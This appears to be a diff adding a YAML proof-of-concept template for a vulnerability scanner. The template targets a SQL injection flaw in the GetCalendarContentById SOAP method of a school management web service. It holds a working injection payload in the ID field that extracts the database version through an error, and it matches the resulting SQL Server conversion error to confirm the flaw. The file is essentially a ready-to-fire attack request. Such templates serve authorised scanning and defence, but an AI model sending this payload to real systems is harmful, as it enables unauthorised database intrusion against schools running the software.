@@ -1,0 +1,32 @@
+name: poc-yaml-xuefenzhi-GetCalendarContentById-sql-injection
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /WebService_PantoSchool.asmx
+      headers:
+        Content-Type: text/xml; charset=utf-8
+      body: "\
+        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n\
+          <soapenv:Header/>\r\n\
+            <soapenv:Body>\r\n\
+              <tem:GetCalendarContentById>\r\n\
+                <!--type: string-->\r\n\
+                 <tem:ID>1' OR 1 IN (SELECT @@version) AND '1'='1</tem:ID>\r\n\
+              </tem:GetCalendarContentById>\r\n\
+            </soapenv:Body>\r\n\
+        </soapenv:Envelope>\r\n\
+        "
+    expression: response.status == 500 && response.body.bcontains(b'转换成数据类型 int 时失败')
+
+
+expression: r0() 
+
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/139843702
